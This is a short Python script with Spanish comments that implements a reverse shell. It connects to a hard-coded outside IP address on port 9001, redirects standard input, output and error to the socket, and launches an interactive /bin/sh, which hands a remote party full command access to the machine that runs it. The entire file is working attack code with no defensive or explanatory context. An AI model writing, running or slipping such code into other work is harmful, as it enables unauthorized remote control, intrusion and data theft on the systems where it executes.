import socket, subprocess, os

HOST = '3.87.103.174'  # La IP del servidor al que se conectará el reverse shell
PORT = 9001              # El puerto en el servidor al que se conectará

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(b'Conexion establecida.\n')

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/sh", "-i"])
